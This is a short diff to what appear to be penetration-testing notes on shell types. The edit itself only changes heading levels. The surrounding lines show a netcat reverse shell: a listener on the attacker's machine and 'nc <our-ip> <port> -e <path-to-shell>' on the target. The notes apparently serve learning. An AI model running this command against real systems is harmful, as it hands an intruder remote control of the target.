@@ -16,7 +16,7 @@ When attempting to gain access to a system, we want to try and get one of 2 type
 
 ## Shell Type Examples
 
-Reverse Shell - We are listening for a connection
+### Reverse Shell - We are listening for a connection
 
 ```
 
@@ -25,7 +25,7 @@ on our machine: nc -nvlp <port>
 on the target machine: nc <our-ip> <port> -e <path-to-shell>
 
 ```
-Bind Shell
+### Bind Shell
 
 ```
 
